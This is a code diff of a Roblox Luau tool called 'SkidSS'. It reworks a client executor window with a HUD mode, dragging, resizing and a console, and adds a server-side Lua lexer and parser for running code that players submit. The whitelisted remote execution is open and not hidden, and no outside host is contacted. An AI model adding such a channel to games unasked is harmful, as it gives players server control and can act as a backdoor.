+			notify = api.notify,
 			fireAction = function(action)
 				ctx.execute({ mode = "action", name = action })
 				api.log("> " .. tostring(action))
 			end,
 			runCode = function(source)
+				api.log("> running\u{2026}")
 				ctx.execute({ mode = "lua", source = source })
 			end,
 		}
 		for _, el in cfg.elements do
 			if type(el) == "table" then
-				table.insert(elementInsts, buildElement(el, gui, env))
+				table.insert(elementInsts, buildElement(el, hud, env))
 			end
+		end
+
+		UserInputService.InputBegan:Connect(function(input)
+			if input.KeyCode == toggleKey then
+				hud.Visible = not hud.Visible
+			end
+		end)
+	else
+
+		local winW = math.max(420, tonumber(cfg.width) or 760)
+		local winH = math.max(300, tonumber(cfg.height) or 480)
+		local openOnJoin = cfg.openOnJoin == true
+
+		root = Theme.create("Frame", {
+			Size = UDim2.fromOffset(winW, winH),
+			Position = UDim2.new(0.5, -winW / 2, 0.5, -winH / 2),
+			AnchorPoint = Vector2.new(0, 0),
+			BackgroundColor3 = Theme.colors.background,
+			BorderSizePixel = 0,
+			Active = true,
+			Visible = openOnJoin,
+			Parent = gui,
+		}, { Theme.corner(10) })
+
+		local headerBar = Theme.create("Frame", {
+			Size = UDim2.new(1, 0, 0, 40),
+			BackgroundColor3 = Theme.colors.panel,
+			BorderSizePixel = 0,
+			Active = true,
+			Parent = root,
+		}, { Theme.corner(10) })
+
+		accentStrip = Theme.create("Frame", {
+			Size = UDim2.new(1, 0, 0, 3),
+			Position = UDim2.new(0, 0, 1, -3),
+			BackgroundColor3 = Theme.colors.accent,
+			BorderSizePixel = 0,
+			Parent = headerBar,
+		})
+
+		titleLabel = Theme.create("TextLabel", {
+			Size = UDim2.new(1, -120, 1, 0),
+			Position = UDim2.fromOffset(14, 0),
+			BackgroundTransparency = 1,
+			Text = type(cfg.title) == "string" and cfg.title or "SkidSS",
+			TextColor3 = Theme.colors.text,
+			Font = Enum.Font.GothamBold,
+			TextSize = 16,
+			TextXAlignment = Enum.TextXAlignment.Left,
+			Parent = headerBar,
+		})
+
+		Theme.create("TextLabel", {
+			Size = UDim2.fromOffset(60, 40),
+			Position = UDim2.new(1, -100, 0, 0),
+			BackgroundTransparency = 1,
+			Text = "v" .. Config.Version,
+			TextColor3 = Theme.colors.subText,
+			Font = Enum.Font.Gotham,
+			TextSize = 12,
+			TextXAlignment = Enum.TextXAlignment.Right,
+			Parent = headerBar,
+		})
+
+		local hide = Theme.create("TextButton", {
+			Size = UDim2.fromOffset(30, 24),
+			Position = UDim2.new(1, -36, 0, 8),
+			BackgroundColor3 = Theme.colors.panelAlt,
+			Text = "\u{2013}",
+			TextColor3 = Theme.colors.text,
+			Font = Enum.Font.GothamBold,
+			TextSize = 16,
+			Parent = headerBar,
+		}, { Theme.corner(6) })
+
+		local content = Theme.create("Frame", {
+			Position = UDim2.fromOffset(12, 84),
+			Size = UDim2.new(1, -24, 1, -252),
+			BackgroundTransparency = 1,
+			ClipsDescendants = true,
+			Parent = root,
+		})
+
+		console = Theme.create("ScrollingFrame", {
+			Position = UDim2.new(0, 12, 1, -160),
+			Size = UDim2.new(1, -24, 0, 110),
+			BackgroundColor3 = Theme.colors.panel,
+			BorderSizePixel = 0,
+			ScrollBarThickness = 5,
+			CanvasSize = UDim2.new(),
+			AutomaticCanvasSize = Enum.AutomaticSize.Y,
+			Parent = root,
+		}, { Theme.corner(8), Theme.padding(8) })
+		local consoleLayout = Theme.listLayout(2)
+		consoleLayout.Parent = console
+
+		quickBar = Theme.create("Frame", {
+			Position = UDim2.new(0, 12, 1, -42),
+			Size = UDim2.new(1, -24, 0, 30),
+			BackgroundTransparency = 1,
+			Parent = root,
+		})
+		local quickRow = Theme.listLayout(6, Enum.FillDirection.Horizontal)
+		quickRow.Parent = quickBar
+
+		local code = CodeTab.build(content, ctx)
+		code.frame.Visible = true
+
+		if type(cfg.buttons) == "table" then
+			for _, button in cfg.buttons do
+				if type(button) == "table" and type(button.label) == "string" then
+					local action = button.action
+					local args = button.args
+					if action then
+						api.addButton(button.label, function()
+							ctx.execute({ mode = "action", name = action, args = args })
+							api.log("> " .. button.label)
+						end)
+					else
+						api.addButton(button.label)
+					end
+				end
+			end
+		end
+
+		local tabBar = Theme.create("Frame", {
+			Position = UDim2.fromOffset(12, 48),
+			Size = UDim2.new(1, -24, 0, 30),
+			BackgroundTransparency = 1,
+			Parent = root,
+		})
+		local tabRow = Theme.listLayout(6, Enum.FillDirection.Horizontal)
+		tabRow.Parent = tabBar
+
+		Theme.create("TextButton", {
+			Size = UDim2.fromOffset(110, 30),
+			BackgroundColor3 = Theme.colors.accent,
+			Text = "Code",
+			TextColor3 = Theme.colors.text,
+			Font = Enum.Font.GothamMedium,
+			TextSize = 13,
+			Parent = tabBar,
+		}, { Theme.corner(6) })
+
+		hide.MouseButton1Click:Connect(function()
+			root.Visible = false
+		end)
+		UserInputService.InputBegan:Connect(function(input)
+			if input.KeyCode == toggleKey then
+				root.Visible = not root.Visible
+			end
+		end)
+
+		local dragging, dragStart, startPos
+		headerBar.InputBegan:Connect(function(input)
+			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+				dragging = true
+				dragStart = input.Position
+				startPos = root.Position
+				input.Changed:Connect(function()
+					if input.UserInputState == Enum.UserInputState.End then
+						dragging = false
+					end
+				end)
+			end
+		end)
+		UserInputService.InputChanged:Connect(function(input)
+			if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+				local delta = input.Position - dragStart
+				root.Position = UDim2.new(
+					startPos.X.Scale, startPos.X.Offset + delta.X,
+					startPos.Y.Scale, startPos.Y.Offset + delta.Y
+				)
+			end
+		end)
+
+		local grip = Theme.create("TextButton", {
+			Size = UDim2.fromOffset(18, 18),
+			Position = UDim2.new(1, -22, 1, -22),
+			BackgroundColor3 = Theme.colors.panelAlt,
+			Text = "\u{2921}",
+			TextColor3 = Theme.colors.subText,
+			Font = Enum.Font.GothamBold,
+			TextSize = 14,
+			Active = true,
+			Parent = root,
+		}, { Theme.corner(4) })
+
+		local resizing, resizeStart, resizeStartSize
+		grip.InputBegan:Connect(function(input)
+			if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+				resizing = true
+				resizeStart = input.Position
+				resizeStartSize = root.AbsoluteSize
+				input.Changed:Connect(function()
+					if input.UserInputState == Enum.UserInputState.End then
+						resizing = false
+					end
+				end)
+			end
+		end)
+		UserInputService.InputChanged:Connect(function(input)
+			if resizing and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+				local delta = input.Position - resizeStart
+				root.Size = UDim2.fromOffset(
+					math.max(420, resizeStartSize.X + delta.X),
+					math.max(300, resizeStartSize.Y + delta.Y)
+				)
+			end
+		end)
+
+		if not openOnJoin then
+			api.notify("Press " .. toggleKey.Name .. " to open SkidSS")
 		end
 	end
 
-	-- Output from the server
 	outputRemote.OnClientEvent:Connect(function(text)
 		api.log(text)
 	end)
-	api.log("SkidSS ready. " .. toggleKey.Name .. " toggles this window.")
-	-- If nothing else is on screen (no custom HUD), tell the player how to open it.
-	if not openOnJoin and (type(cfg.elements) ~= "table" or #cfg.elements == 0) then
-		api.notify("Press " .. toggleKey.Name .. " to open SkidSS")
-	end
-
-	-- Hide / toggle
-	hide.MouseButton1Click:Connect(function()
-		root.Visible = false
-	end)
-	-- Toggle works even while a TextBox is focused (the key isn't a typing key).
-	UserInputService.InputBegan:Connect(function(input)
-		if input.KeyCode == toggleKey then
-			root.Visible = not root.Visible
-		end
-	end)
-
-	-- Dragging
-	local dragging, dragStart, startPos
-	headerBar.InputBegan:Connect(function(input)
-		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-			dragging = true
-			dragStart = input.Position
-			startPos = root.Position
-			input.Changed:Connect(function()
-				if input.UserInputState == Enum.UserInputState.End then
-					dragging = false
-				end
-			end)
-		end
-	end)
-	UserInputService.InputChanged:Connect(function(input)
-		if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
-			local delta = input.Position - dragStart
-			root.Position = UDim2.new(
-				startPos.X.Scale, startPos.X.Offset + delta.X,
-				startPos.Y.Scale, startPos.Y.Offset + delta.Y
-			)
-		end
-	end)
-
-	-- Resize grip (bottom-right corner). The window's regions are anchored
-	-- relative to root, so changing root size reflows everything.
-	local grip = Theme.create("TextButton", {
-		Size = UDim2.fromOffset(18, 18),
-		Position = UDim2.new(1, -22, 1, -22),
-		BackgroundColor3 = Theme.colors.panelAlt,
-		Text = "\u{2921}",
-		TextColor3 = Theme.colors.subText,
-		Font = Enum.Font.GothamBold,
-		TextSize = 14,
-		Active = true,
-		Parent = root,
-	}, { Theme.corner(4) })
-
-	local resizing, resizeStart, resizeStartSize
-	grip.InputBegan:Connect(function(input)
-		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-			resizing = true
-			resizeStart = input.Position
-			resizeStartSize = root.AbsoluteSize
-			input.Changed:Connect(function()
-				if input.UserInputState == Enum.UserInputState.End then
-					resizing = false
-				end
-			end)
-		end
-	end)
-	UserInputService.InputChanged:Connect(function(input)
-		if resizing and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
-			local delta = input.Position - resizeStart
-			root.Size = UDim2.fromOffset(
-				math.max(420, resizeStartSize.X + delta.X),
-				math.max(300, resizeStartSize.Y + delta.Y)
-			)
-		end
-	end)
+	api.log("SkidSS ready \u{2014} " .. toggleKey.Name .. " toggles.")
 
 	return api
 end
@@ -4126,12 +5410,10 @@ end
 return Window
 end)()
 
--- Client entry point. Asks the server whether this player is whitelisted and
--- only then builds the executor window.
-
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Net = SkidSS_Net
 
+local CustomInterface = function() return {} end
 
 local allowed = Net.get(Net.RequestAccess):InvokeServer()
 if not allowed then
@@ -4152,10 +5434,1319 @@ Window.mount(cfg)
 end
 
 -- ===== SERVER (do not edit) =====
-local SkidSS_ServerApi = (function()
--- The surface that server-run block programs are allowed to touch. emit() sends a
--- console line back to the player who ran the script.
+-- Server runtime: the default CustomRuntime table, then your Script-tab blocks
+-- (hooks + actions) which override it. Server-only — never runs on the client.
+-- ===== CUSTOM RUNTIME (written by Studio; safe to overwrite) =====
+local CustomRuntime = {
+	onPlayerAdded = function(_player) end,
+	onPlayerRemoving = function(_player) end,
+	onRequestReceived = function(_player, _payload) return true end,
+	customActions = {},
+}
+-- ===== END CUSTOM RUNTIME =====
 
+local SkidSS_LuaLexer = (function()
+local Lexer = {}
+
+local KEYWORDS = {
+	["and"] = true, ["break"] = true, ["do"] = true, ["else"] = true,
+	["elseif"] = true, ["end"] = true, ["false"] = true, ["for"] = true,
+	["function"] = true, ["if"] = true, ["in"] = true, ["local"] = true,
+	["nil"] = true, ["not"] = true, ["or"] = true, ["repeat"] = true,
+	["return"] = true, ["then"] = true, ["true"] = true, ["until"] = true,
+	["while"] = true,
+}
+
+local SYM3 = { ["..."] = true, ["//="] = true, ["..="] = true }
+local SYM2 = {
+	[".."] = true, ["=="] = true, ["~="] = true, ["<="] = true, [">="] = true,
+	["//"] = true, ["::"] = true, ["->"] = true, ["+="] = true, ["-="] = true,
+	["*="] = true, ["/="] = true, ["%="] = true, ["^="] = true,
+}
+local SYM1 = {
+	["+"] = true, ["-"] = true, ["*"] = true, ["/"] = true, ["%"] = true,
+	["^"] = true, ["#"] = true, ["<"] = true, [">"] = true, ["="] = true,
+	["("] = true, [")"] = true, ["{"] = true, ["}"] = true, ["["] = true,
+	["]"] = true, [";"] = true, [":"] = true, [","] = true, ["."] = true,
+	["?"] = true, ["|"] = true, ["&"] = true,
+}
+
+local ESCAPES = {
+	["n"] = "\n", ["t"] = "\t", ["r"] = "\r", ["a"] = "\a", ["b"] = "\b",
+	["f"] = "\f", ["v"] = "\v", ["\\"] = "\\", ['"'] = '"', ["'"] = "'",
+	["\n"] = "\n",
+}
+
+local function isDigit(c) return c >= "0" and c <= "9" end
+local function isHex(c)
+	return (c >= "0" and c <= "9") or (c >= "a" and c <= "f") or (c >= "A" and c <= "F")
+end
+local function isAlpha(c)
+	return c == "_" or (c >= "a" and c <= "z") or (c >= "A" and c <= "Z")
+end
+local function isAlphaNum(c) return isAlpha(c) or isDigit(c) end
+
+function Lexer.tokenize(src)
+	local tokens = {}
+	local i = 1
+	local n = #src
+	local line = 1
+
+	local function err(msg)
+		error({ __skidss_lex = true, message = "input:" .. line .. ": " .. msg }, 0)
+	end
+	local function at(k) return string.sub(src, k, k) end
+
+	local function readLong()
+		local j = i + 1
+		local level = 0
+		while at(j) == "=" do level += 1; j += 1 end
+		if at(j) ~= "[" then return nil end
+		j += 1
+
+		if at(j) == "\r" then j += 1 end
+		if at(j) == "\n" then line += 1; j += 1 end
+		local closer = "]" .. string.rep("=", level) .. "]"
+		local startLine = line
+		local from = j
+		while true do
+			if j > n then line = startLine; err("unfinished long bracket") end
+			local c = at(j)
+			if c == "]" and string.sub(src, j, j + level + 1) == closer then
+				local text = string.sub(src, from, j - 1)
+				i = j + level + 2
+				return text
+			end
+			if c == "\n" then line += 1 end
+			j += 1
+		end
+	end
+
+	local function readString(quote)
+		local parts = {}
+		i += 1
+		while true do
+			local c = at(i)
+			if c == "" or c == "\n" then err("unfinished string") end
+			if c == quote then i += 1; break end
+			if c == "\\" then
+				local e = at(i + 1)
+				if e == "x" then
+					local hex = string.sub(src, i + 2, i + 3)
+					local b = tonumber(hex, 16)
+					if not b then err("hexadecimal digit expected") end
+					parts[#parts + 1] = string.char(b)
+					i += 4
+				elseif e == "z" then
+					i += 2
+					while at(i):match("%s") do
+						if at(i) == "\n" then line += 1 end
+						i += 1
+					end
+				elseif e == "u" then
+					if at(i + 2) ~= "{" then err("missing '{' in \\u{xxxx}") end
+					local j = i + 3
+					while at(j) ~= "}" do
+						if at(j) == "" then err("unfinished string") end
+						j += 1
+					end
+					local cp = tonumber(string.sub(src, i + 3, j - 1), 16)
+					if not cp then err("hexadecimal digit expected") end
+					parts[#parts + 1] = utf8.char(cp)
+					i = j + 1
+				elseif isDigit(e) then
+					local d = e
+					local j = i + 2
+					for _ = 1, 2 do
+						if isDigit(at(j)) then d ..= at(j); j += 1 else break end
+					end
+					local b = tonumber(d)
+					if b > 255 then err("decimal escape too large") end
+					parts[#parts + 1] = string.char(b)
+					i = j
+				else
+					local rep = ESCAPES[e]
+					if not rep then err("invalid escape sequence '\\" .. e .. "'") end
+					if e == "\n" then line += 1 end
+					parts[#parts + 1] = rep
+					i += 2
+				end
+			else
+				parts[#parts + 1] = c
+				i += 1
+			end
+		end
+		return table.concat(parts)
+	end
+
+	local function readNumber()
+		local start = i
+		local two = string.sub(src, i, i + 1)
+		if two == "0x" or two == "0X" then
+			i += 2
+			while i <= n and (isHex(at(i)) or at(i) == "_") do i += 1 end
+		elseif two == "0b" or two == "0B" then
+			i += 2
+			while i <= n and (at(i) == "0" or at(i) == "1" or at(i) == "_") do i += 1 end
+		else
+			while i <= n and (isDigit(at(i)) or at(i) == "_") do i += 1 end
+			if at(i) == "." then
+				i += 1
+				while i <= n and (isDigit(at(i)) or at(i) == "_") do i += 1 end
+			end
+			local e = at(i)
+			if e == "e" or e == "E" then
+				i += 1
+				if at(i) == "+" or at(i) == "-" then i += 1 end
+				while i <= n and isDigit(at(i)) do i += 1 end
+			end
+		end
+		local text = string.sub(src, start, i - 1)
+		local clean = string.gsub(text, "_", "")
+		local value
+		local prefix = string.sub(clean, 1, 2)
+		if prefix == "0b" or prefix == "0B" then
+			value = tonumber(string.sub(clean, 3), 2)
+		else
+			value = tonumber(clean)
+		end
+		if not value then err("malformed number near '" .. text .. "'") end
+		return value
+	end
+
+	while i <= n do
+		local c = at(i)
+		if c == "\n" then
+			line += 1; i += 1
+		elseif c == " " or c == "\t" or c == "\r" or c == "\v" or c == "\f" then
+			i += 1
+		elseif c == "-" and at(i + 1) == "-" then
+
+			i += 2
+			if at(i) == "[" then
+				local saved = i
+				local text = readLong()
+				if not text then i = saved; while i <= n and at(i) ~= "\n" do i += 1 end end
+			else
+				while i <= n and at(i) ~= "\n" do i += 1 end
+			end
+		elseif isAlpha(c) then
+			local start = i
+			while i <= n and isAlphaNum(at(i)) do i += 1 end
+			local word = string.sub(src, start, i - 1)
+			tokens[#tokens + 1] = {
+				type = KEYWORDS[word] and "Keyword" or "Name",
+				value = word,
+				line = line,
+			}
+		elseif isDigit(c) or (c == "." and isDigit(at(i + 1))) then
+			local ln = line
+			tokens[#tokens + 1] = { type = "Number", value = readNumber(), line = ln }
+		elseif c == '"' or c == "'" then
+			local ln = line
+			tokens[#tokens + 1] = { type = "String", value = readString(c), line = ln }
+		elseif c == "[" and (at(i + 1) == "[" or at(i + 1) == "=") then
+			local saved = i
+			local ln = line
+			local text = readLong()
+			if text then
+				tokens[#tokens + 1] = { type = "String", value = text, line = ln }
+			else
+
+				i = saved
+				tokens[#tokens + 1] = { type = "Symbol", value = "[", line = line }
+				i += 1
+			end
+		else
+			local s3 = string.sub(src, i, i + 2)
+			local s2 = string.sub(src, i, i + 1)
+			if SYM3[s3] then
+				tokens[#tokens + 1] = { type = "Symbol", value = s3, line = line }; i += 3
+			elseif SYM2[s2] then
+				tokens[#tokens + 1] = { type = "Symbol", value = s2, line = line }; i += 2
+			elseif SYM1[c] then
+				tokens[#tokens + 1] = { type = "Symbol", value = c, line = line }; i += 1
+			else
+				err("unexpected symbol '" .. c .. "'")
+			end
+		end
+	end
+
+	tokens[#tokens + 1] = { type = "Eof", value = "<eof>", line = line }
+	return tokens
+end
+
+function Lexer.safeTokenize(src)
+	local ok, result = pcall(Lexer.tokenize, src)
+	if ok then return result end
+	if type(result) == "table" and result.__skidss_lex then
+		return nil, result.message
+	end
+	return nil, tostring(result)
+end
+
+return Lexer
+end)()
+
+local SkidSS_LuaParser = (function()
+local Lexer = SkidSS_LuaLexer
+
+local Parser = {}
+
+local COMPOUND = {
+	["+="] = "+", ["-="] = "-", ["*="] = "*", ["/="] = "/", ["//="] = "//",
+	["%="] = "%", ["^="] = "^", ["..="] = "..",
+}
+
+local BINPRI = {
+	["or"] = { 1, 1 }, ["and"] = { 2, 2 },
+	["<"] = { 3, 3 }, [">"] = { 3, 3 }, ["<="] = { 3, 3 }, [">="] = { 3, 3 },
+	["~="] = { 3, 3 }, ["=="] = { 3, 3 },
+	[".."] = { 9, 8 },
+	["+"] = { 10, 10 }, ["-"] = { 10, 10 },
+	["*"] = { 11, 11 }, ["/"] = { 11, 11 }, ["//"] = { 11, 11 }, ["%"] = { 11, 11 },
+	["^"] = { 14, 13 },
+}
+local UNARY_PRI = 12
+
+function Parser.parse(tokens)
+	local pos = 1
+
+	local function cur() return tokens[pos] end
+	local function peek(off) return tokens[pos + off] end
+	local function advance() local t = tokens[pos]; pos += 1; return t end
+
+	local function isSym(t, v) return t ~= nil and t.type == "Symbol" and t.value == v end
+	local function isKw(t, v) return t ~= nil and t.type == "Keyword" and t.value == v end
+	local function checkSym(v) return isSym(cur(), v) end
+	local function checkKw(v) return isKw(cur(), v) end
+	local function acceptSym(v) if checkSym(v) then return advance() end return nil end
+	local function acceptKw(v) if checkKw(v) then return advance() end return nil end
+
+	local function perror(msg, tok)
+		tok = tok or cur()
+		error({ __skidss_parse = true, message = "input:" .. (tok and tok.line or 0) .. ": " .. msg }, 0)
+	end
+	local function expectSym(v) if not checkSym(v) then perror("'" .. v .. "' expected") end return advance() end
+	local function expectKw(v) if not checkKw(v) then perror("'" .. v .. "' expected") end return advance() end
+	local function expectName()
+		local t = cur()
+		if t.type ~= "Name" then perror("<name> expected") end
+		pos += 1
+		return t.value
+	end
+
+	local parseExpr, parseBlock, parseStatement, parseFuncBody, skipType
+
+	local function skipBalanced()
+		local matching = { ["("] = ")", ["{"] = "}", ["["] = "]", ["<"] = ">" }
+		local stack = {}
+		repeat
+			local t = advance()
+			if t.type == "Eof" then perror("unfinished type annotation") end
+			if t.type == "Symbol" then
+				if matching[t.value] then
+					stack[#stack + 1] = matching[t.value]
+				elseif t.value == stack[#stack] then
+					stack[#stack] = nil
+				end
+			end
+		until #stack == 0
+	end
+
+	local function skipTypePrimary()
+		local t = cur()
+		if isSym(t, "(") or isSym(t, "{") then
+			skipBalanced()
+		elseif t.type == "Name" then
+			advance()
+			while acceptSym(".") do expectName() end
+			if checkSym("<") then skipBalanced() end
+		elseif t.type == "String" or t.type == "Number" then
+			advance()
+		elseif isKw(t, "nil") or isKw(t, "true") or isKw(t, "false") then
+			advance()
+		elseif isKw(t, "function") then
+			advance()
+			if checkSym("<") then skipBalanced() end
+			if checkSym("(") then skipBalanced() end
+			if acceptSym("->") then skipType() end
+		else
+			perror("type annotation not supported in this interpreter (v1)")
+		end
+	end
+
+	function skipType()
+		skipTypePrimary()
+		while acceptSym("?") do end
+		while checkSym("|") or checkSym("&") do
+			advance(); skipTypePrimary(); while acceptSym("?") do end
+		end
+		if acceptSym("->") then skipType() end
+	end
+
+	local function parseExprList()
+		local list = { parseExpr() }
+		while acceptSym(",") do list[#list + 1] = parseExpr() end
+		return list
+	end
+
+	local function parseTableConstructor()
+		local line = cur().line
+		expectSym("{")
+		local fields = {}
+		while not checkSym("}") do
+			if checkSym("[") then
+				advance()
+				local k = parseExpr()
+				expectSym("]"); expectSym("=")
+				fields[#fields + 1] = { type = "rec", key = k, value = parseExpr() }
+			elseif cur().type == "Name" and isSym(peek(1), "=") then
+				local name = advance().value
+				advance()
+				fields[#fields + 1] = { type = "named", name = name, value = parseExpr() }
+			else
+				fields[#fields + 1] = { type = "item", value = parseExpr() }
+			end
+			if not (acceptSym(",") or acceptSym(";")) then break end
+		end
+		expectSym("}")
+		return { kind = "Table", fields = fields, line = line }
+	end
+
+	local function parseArgs()
+		if checkSym("(") then
+			advance()
+			local args = {}
+			if not checkSym(")") then args = parseExprList() end
+			expectSym(")")
+			return args
+		elseif cur().type == "String" then
+			local t = advance()
+			return { { kind = "String", value = t.value, line = t.line } }
+		elseif checkSym("{") then
+			return { parseTableConstructor() }
+		end
+		perror("function arguments expected")
+	end
+
+	local function parsePrimary()
+		local t = cur()
+		if isSym(t, "(") then
+			advance()
+			local e = parseExpr()
+			expectSym(")")
+			return { kind = "Paren", expr = e, line = t.line }
+		elseif t.type == "Name" then
+			advance()
+			return { kind = "Name", name = t.value, line = t.line }
+		end
+		perror("unexpected symbol near '" .. tostring(t.value) .. "'")
+	end
+
+	local function parseSuffixed()
+		local e = parsePrimary()
+		while true do
+			local t = cur()
+			if isSym(t, ".") then
+				advance()
+				local name = expectName()
+				e = { kind = "Index", obj = e, index = { kind = "String", value = name, line = t.line }, field = name, line = t.line }
+			elseif isSym(t, "[") then
+				advance()
+				local k = parseExpr()
+				expectSym("]")
+				e = { kind = "Index", obj = e, index = k, line = t.line }
+			elseif isSym(t, ":") then
+				advance()
+				local m = expectName()
+				e = { kind = "MethodCall", obj = e, method = m, args = parseArgs(), line = t.line }
+			elseif isSym(t, "(") or isSym(t, "{") or t.type == "String" then
+				e = { kind = "Call", func = e, args = parseArgs(), line = t.line }
+			else
+				break
+			end
+		end
+		return e
+	end
+
+	local function parseSimple()
+		local t = cur()
+		if t.type == "Number" then advance(); return { kind = "Number", value = t.value, line = t.line }
+		elseif t.type == "String" then advance(); return { kind = "String", value = t.value, line = t.line }
+		elseif isKw(t, "nil") then advance(); return { kind = "Nil", line = t.line }
+		elseif isKw(t, "true") then advance(); return { kind = "True", line = t.line }
+		elseif isKw(t, "false") then advance(); return { kind = "False", line = t.line }
+		elseif isSym(t, "...") then advance(); return { kind = "Vararg", line = t.line }
+		elseif isSym(t, "{") then return parseTableConstructor()
+		elseif isKw(t, "function") then
+			advance()
+			local fb = parseFuncBody()
+			return { kind = "Function", params = fb.params, isVararg = fb.isVararg, body = fb.body, line = t.line }
+		end
+		return parseSuffixed()
+	end
+
+	local function binOpOf(t)
+		if t.type == "Symbol" and BINPRI[t.value] then return t.value end
+		if t.type == "Keyword" and (t.value == "and" or t.value == "or") then return t.value end
+		return nil
+	end
+
+	local function parseSubExpr(limit)
+		local e
+		local t = cur()
+		if (t.type == "Symbol" and (t.value == "-" or t.value == "#")) or isKw(t, "not") then
+			advance()
+			e = { kind = "Unop", op = t.value, operand = parseSubExpr(UNARY_PRI), line = t.line }
+		else
+			e = parseSimple()
+		end
+		while true do
+			local op = binOpOf(cur())
+			if not op then break end
+			local pri = BINPRI[op]
+			if pri[1] <= limit then break end
+			local opTok = advance()
+			e = { kind = "Binop", op = op, lhs = e, rhs = parseSubExpr(pri[2]), line = opTok.line }
+		end
+		return e
+	end
+
+	function parseExpr()
+		local e = parseSubExpr(0)
+		while acceptSym("::") do skipType() end
+		return e
+	end
+
+	function parseFuncBody()
+		if checkSym("<") then skipBalanced() end
+		expectSym("(")
+		local params = {}
+		local isVararg = false
+		if not checkSym(")") then
+			while true do
+				if checkSym("...") then
+					advance(); isVararg = true
+					if acceptSym(":") then skipType() end
+					break
+				end
+				local nm = expectName()
+				if acceptSym(":") then skipType() end
+				params[#params + 1] = nm
+				if not acceptSym(",") then break end
+			end
+		end
+		expectSym(")")
+		if acceptSym(":") then skipType() end
+		local body = parseBlock()
+		expectKw("end")
+		return { params = params, isVararg = isVararg, body = body }
+	end
+
+	local function parseLocal()
+		local line = cur().line
+		expectKw("local")
+		if acceptKw("function") then
+			local name = expectName()
+			local fb = parseFuncBody()
+			return {
+				kind = "LocalFunction",
+				name = name,
+				func = { kind = "Function", params = fb.params, isVararg = fb.isVararg, body = fb.body, line = line },
+				line = line,
+			}
+		end
+		local names = {}
+		while true do
+			names[#names + 1] = expectName()
+			if acceptSym("<") then expectName(); expectSym(">") end
+			if acceptSym(":") then skipType() end
+			if not acceptSym(",") then break end
+		end
+		local exprs = {}
+		if acceptSym("=") then exprs = parseExprList() end
+		return { kind = "Local", names = names, exprs = exprs, line = line }
+	end
+
+	local function parseIf()
+		local line = cur().line
+		expectKw("if")
+		local clauses = {}
+		local cond = parseExpr()
+		expectKw("then")
+		clauses[#clauses + 1] = { cond = cond, body = parseBlock() }
+		while checkKw("elseif") do
+			advance()
+			local c = parseExpr()
+			expectKw("then")
+			clauses[#clauses + 1] = { cond = c, body = parseBlock() }
+		end
+		local elseBody = nil
+		if acceptKw("else") then elseBody = parseBlock() end
+		expectKw("end")
+		return { kind = "If", clauses = clauses, elseBody = elseBody, line = line }
+	end
+
+	local function parseWhile()
+		local line = cur().line
+		expectKw("while")
+		local cond = parseExpr()
+		expectKw("do")
+		local body = parseBlock()
+		expectKw("end")
+		return { kind = "While", cond = cond, body = body, line = line }
+	end
+
+	local function parseRepeat()
+		local line = cur().line
+		expectKw("repeat")
+		local body = parseBlock()
+		expectKw("until")
+		return { kind = "Repeat", body = body, cond = parseExpr(), line = line }
+	end
+
+	local function parseFor()
+		local line = cur().line
+		expectKw("for")
+		local n1 = expectName()
+		if acceptSym(":") then skipType() end
+		if acceptSym("=") then
+			local startE = parseExpr()
+			expectSym(",")
+			local stopE = parseExpr()
+			local stepE = nil
+			if acceptSym(",") then stepE = parseExpr() end
+			expectKw("do")
+			local body = parseBlock()
+			expectKw("end")
+			return { kind = "NumericFor", var = n1, start = startE, stop = stopE, step = stepE, body = body, line = line }
+		end
+		local names = { n1 }
+		while acceptSym(",") do
+			names[#names + 1] = expectName()
+			if acceptSym(":") then skipType() end
+		end
+		expectKw("in")
+		local exprs = parseExprList()
+		expectKw("do")
+		local body = parseBlock()
+		expectKw("end")
+		return { kind = "GenericFor", names = names, exprs = exprs, body = body, line = line }
+	end
+
+	local function parseFunctionStat()
+		local line = cur().line
+		expectKw("function")
+		local target = { kind = "Name", name = expectName(), line = line }
+		while acceptSym(".") do
+			local f = expectName()
+			target = { kind = "Index", obj = target, index = { kind = "String", value = f, line = line }, field = f, line = line }
+		end
+		local isMethod = false
+		if acceptSym(":") then
+			local m = expectName()
+			target = { kind = "Index", obj = target, index = { kind = "String", value = m, line = line }, field = m, line = line }
+			isMethod = true
+		end
+		local fb = parseFuncBody()
+		if isMethod then table.insert(fb.params, 1, "self") end
+		return {
+			kind = "Assign",
+			targets = { target },
+			exprs = { { kind = "Function", params = fb.params, isVararg = fb.isVararg, body = fb.body, line = line } },
+			line = line,
+		}
+	end
+
+	local function parseExprStatement()
+		local first = parseSuffixed()
+		local t = cur()
+		if isSym(t, "=") or isSym(t, ",") then
+			local targets = { first }
+			while acceptSym(",") do targets[#targets + 1] = parseSuffixed() end
+			expectSym("=")
+			local exprs = parseExprList()
+			for _, tg in ipairs(targets) do
+				if tg.kind ~= "Name" and tg.kind ~= "Index" then perror("cannot assign to this expression", tg) end
+			end
+			return { kind = "Assign", targets = targets, exprs = exprs, line = first.line }
+		elseif t.type == "Symbol" and COMPOUND[t.value] then
+			advance()
+			if first.kind ~= "Name" and first.kind ~= "Index" then perror("cannot assign to this expression", first) end
+			return { kind = "CompoundAssign", op = COMPOUND[t.value], target = first, expr = parseExpr(), line = t.line }
+		end
+		if first.kind ~= "Call" and first.kind ~= "MethodCall" then
+			perror("syntax error near '" .. tostring(t.value) .. "'")
+		end
+		return { kind = "CallStat", call = first, line = first.line }
+	end
+
+	local function continueIsStatement()
+		local nxt = peek(1)
+		if nxt == nil or nxt.type == "Eof" then return true end
+		if nxt.type == "String" then return false end
+		if nxt.type == "Symbol" then
+			local v = nxt.value
+			if v == "=" or v == "," or v == "." or v == "[" or v == "(" or v == "{"
+				or v == ":" or COMPOUND[v] then
+				return false
+			end
+		end
+		return true
+	end
+
+	function parseStatement()
+		local t = cur()
+		if isSym(t, ";") then advance(); return nil end
